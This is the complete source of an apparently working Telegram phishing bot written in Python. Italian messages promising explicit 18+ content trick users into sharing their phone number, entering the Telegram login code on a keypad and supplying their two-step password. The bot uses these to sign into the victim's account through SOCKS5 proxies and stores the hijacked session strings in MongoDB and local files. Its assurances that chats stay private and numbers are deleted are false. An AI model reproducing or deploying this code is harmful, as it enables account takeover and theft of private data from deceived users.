import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Основная прокси (старая, для совместимости)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Вторая прокси (новая)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# Список доступных прокси (первая - старая основная)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """Выбираем прокси для номера"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """Очищает данные пользователя из временных хранилищ"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """Обновляет или создает запись пользователя с новыми данной"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении лога пользователя: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """Отправляет/обновляет клавиатуру для ввода кода"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Invia Codice", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"📱 *Codice di verifica:*\n\n`{current_code}`\n\n_Premi i numeri per inserire il codice ricevuto da Telegram._" if current_code else "🔢 *Inserisci il codice di verifica*\n\n_Premi i pulsanti qui sotto per inserire il codice che hai ricevuto da Telegram._"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

async def send_welcome_photo(user_id):
    """Отправляет приветственное фото с текстом"""
    try:
        photo_path = "welcome_photo.jpg"
        if os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                await bot.send_photo(
                    user_id,
                    photo,
                    caption=(
                        "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
                        "💋 *Scopri contenuti piccanti che non trovi da nessuna parte!*\n"
                        "• Oltre 10.000 foto hot e video privati\n"
                        "• Ragazze italiane e modelle internazionali\n"
                        "• Contenuti amatoriali esclusivi\n"
                        "• Live session e materiale inedito\n\n"
                        "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n"
                        "La verifica è veloce, sicura e ti darà accesso immediato a:\n"
                        "✅ Video privati delle ragazze più hot\n"
                        "✅ Foto esclusive non pubblicate altrove\n"
                        "✅ Chat dirette con le modelle\n"
                        "✅ Contenuti aggiornati ogni giorno\n\n"
                        "⚠️ *SOLO PER MAGGIORENNI* - Accesso immediato dopo la verifica!"
                    ),
                    parse_mode='Markdown'
                )
        else:
            await bot.send_message(
                user_id,
                "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
                "💋 *Scopri contenuti piccanti che non trovi da nessuna parte!*\n"
                "• Oltre 10.000 foto hot e video privati\n"
                "• Ragazze italiane e modelle internazionali\n"
                "• Contenuti amatoriali esclusivi\n"
                "• Live session e materiale inedito\n\n"
                "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n"
                "La verifica è veloce, sicura e ti darà accesso immediato a:\n"
                "✅ Video privati delle ragazze più hot\n"
                "✅ Foto esclusive non pubblicate altrove\n"
                "✅ Chat dirette con le modelle\n"
                "✅ Contenuti aggiornati ogni giorno\n\n"
                "⚠️ *SOLO PER MAGGIORENNI* - Accesso immediato dopo la verifica!",
                parse_mode='Markdown'
            )
    except Exception as e:
        logging.error(f"Error sending welcome photo: {e}")
        await bot.send_message(
            user_id,
            "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
            "💋 Scopri contenuti piccanti esclusivi! Verifica il tuo account per accedere immediatamente a migliaia di foto e video hot!",
            parse_mode='Markdown'
        )

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # Отправляем фото с приветствием
    await send_welcome_photo(user.id)

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🔓 SBLOCCA ACCESSO IMMEDIATO", callback_data="auth_account"))
    
    await message.answer(
        "🔞 *ACCESSO RISERVATO ADULTI 18+*\n\n"
        "Per accedere al nostro contenuto ESCLUSIVO e PICCANTE, è necessario verificare la tua età con il tuo account Telegram.\n\n"
        "✅ *Processo 100% sicuro e privato:*\n"
        "• Non vediamo le tue chat o messaggi\n"
        "• Non condividiamo i tuoi dati con nessuno\n"
        "• Solo verifica dell'età per contenuti 18+\n\n"
        "🎁 *Dopo la verifica otterrai subito:*\n"
        "• Accesso a migliaia di foto hot\n"
        "• Video privati delle modelle\n"
        "• Contenuti esclusivi ogni giorno\n"
        "• Chat con ragazze disponibili\n\n"
        "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Condividi il mio numero", request_contact=True))

    await bot.send_message(
        user_id,
        "🔥 *FASE 1: VERIFICA RAPIDA* 🔞\n\n"
        "Quasi tutto è pronto! Per accedere ai contenuti ADULTI esclusivi, dobbiamo verificare che tu sia maggiorenne.\n\n"
        "📋 *Cosa succede ora:*\n"
        "1. Condividi il numero → Telegram ti invia un codice\n"
        "2. Inserisci il codice → Verifica completata\n"
        "3. ACCESSO SBLOCCATO → Contenuto 18+ disponibile\n\n"
        "💎 *Dopo la verifica avrai subito:*\n"
        "• Foto e video hot delle ragazze più belle\n"
        "• Contenuti amatoriali esclusivi\n"
        "• Materiale nuovo ogni giorno\n"
        "• Chat private con le modelle\n\n"
        "⚠️ Il tuo numero viene usato solo per questa verifica e poi cancellato. Tutto è anonimo e sicuro!",
        parse_mode='Markdown',
        reply_markup=kb
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"Ошибка при определении геолокации: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        
        # Сначала отправляем объяснение
        await message.answer(
            "✅ *Numero ricevuto!* 🔞\n\n"
            "📨 *FASE 2: CODICE DI VERIFICA*\n\n"
            "Telegram ti ha inviato un SMS con un codice di 5 cifre.\n\n"
            "🔢 *Istruzioni rapide:*\n"
            "1. Controlla i messaggi sul tuo telefono\n"
            "2. Inserisci il codice qui sotto usando i pulsanti\n"
            "3. Premi 'Invia Codice' quando pronto\n\n"
            "⚡️ *DOPO IL CODICE AVRAI SUBITO:*\n"
            "• Accesso completo ai contenuti 18+\n"
            "• Migliaia di foto e video hot\n"
            "• Chat con ragazze vere\n"
            "• Materiale esclusivo ogni giorno\n\n"
            "_Il codice scade dopo 5 minuti per sicurezza._",
            parse_mode='Markdown'
        )
        
        # Затем отправляем клавиатуру
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
    except Exception as e:
        await message.answer(f"❌ Errore nell'invio del codice: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ Prima devi condividere il numero", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Errore interno. Ricomincia da /start", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Inserisci prima il codice", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Codice troppo lungo", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Sessione scaduta. Ricomincia da /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "🎉 *VERIFICA COMPLETATA!* 🔞🎊\n\n"
                "✅ *Accesso SBLOCCATO ai contenuti ADULTI!*\n\n"
                "🔥 *BENVENUTO NELLA ZONA ESCLUSIVA 18+!*\n\n"
                "💋 *ORA HAI ACCESSO A:*\n"
                "• Oltre 10.000 foto hot e video privati\n"
                "• Ragazze italiane e modelle internazionali\n"
                "• Contenuti amatoriali esclusivi\n"
                "• Live session e materiale inedito\n"
                "• Chat dirette con le modelle\n\n"
                "🚀 *Il materiale sta arrivando...*\n"
                "Stiamo preparando il tuo accesso completo.\n"
                "Riceverai i primi contenuti entro pochi minuti!\n\n"
                "⚠️ *MANTIENI SEGRETO L'ACCESSO* - Contenuto esclusivo solo per te!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(
                user_id,
                "🔐 *FASE 3: PROTEZIONE AGGIUNTIVA* 🔞\n\n"
                "Il tuo account ha la protezione extra attivata.\n\n"
                "📝 *Invia la password di sicurezza qui sotto:*\n\n"
                "⚡️ *DOPO LA PASSWORD AVRAI SUBITO:*\n"
                "• Accesso completo ai contenuti 18+\n"
                "• Migliaia di foto e video hot\n"
                "• Chat con ragazze vere\n\n"
                "_Questa password è diversa dal codice SMS._",
                parse_mode='Markdown'
            )
    except PhoneCodeExpiredError:
        await bot.send_message(
            user_id,
            "⏰ *Codice scaduto*\n\n"
            "Il codice è scaduto. Usa /start per ricevere un nuovo codice e accedere ai contenuti hot!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(
            user_id,
            "❌ *Codice errato*\n\n"
            "Il codice non è valido. Controlla l'SMS e inserisci di nuovo il codice per sbloccare i contenuti 18+!",
            parse_mode='Markdown'
        )
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(
            user_id,
            "🔐 *PROTEZIONE EXTRA RILEVATA* 🔞\n\n"
            "Il tuo account ha la verifica in due passaggi attivata.\n\n"
            "📝 *Invia la password di sicurezza qui sotto per sbloccare tutto:*\n\n"
            "💎 *DOPO LA PASSWORD AVRAI:*\n"
            "• Accesso immediato ai contenuti 18+\n"
            "• Foto e video esclusivi\n"
            "• Chat private con le modelle",
            parse_mode='Markdown'
        )
    except Exception as e:
        await bot.send_message(
            user_id,
            f"❌ *Errore durante la verifica*\n\n"
            f"Problema tecnico:\n`{e}`\n\n"
            f"Riprova con /start per accedere ai contenuti esclusivi!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Sessione scaduta. Usa /start per ricominciare")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "🎉 *PROTEZIONE VERIFICATA!* 🔞🎊\n\n"
                "✅ *Accesso COMPLETO ai contenuti ADULTI!*\n\n"
                "🔥 *BENVENUTO NELLA ZONA ESCLUSIVA 18+!*\n\n"
                "💋 *ORA PUOI GODERTI:*\n"
                "• Oltre 10.000 foto hot e video privati\n"
                "• Ragazze italiane e modelle internazionali\n"
                "• Contenuti amatoriali esclusivi\n"
                "• Live session e materiale inedito\n"
                "• Chat dirette con le modelle\n\n"
                "🚀 *Il materiale sta arrivando...*\n"
                "Stiamo preparando il tuo accesso completo.\n"
                "Riceverai i primi contenuti entro pochi minuti!\n\n"
                "⚠️ *MANTIENI SEGRETO L'ACCESSO* - Contenuto esclusivo solo per te!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer(
                "❌ *Password errata*\n\n"
                "La password non è corretta. Invia la password giusta per sbloccare i contenuti 18+!",
                parse_mode='Markdown'
            )
    except Exception as e:
        await message.answer(
            f"❌ *Errore di verifica*\n\n"
            f"Problema: `{e}`\n\n"
            f"Riprova con /start per accedere ai contenuti esclusivi!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)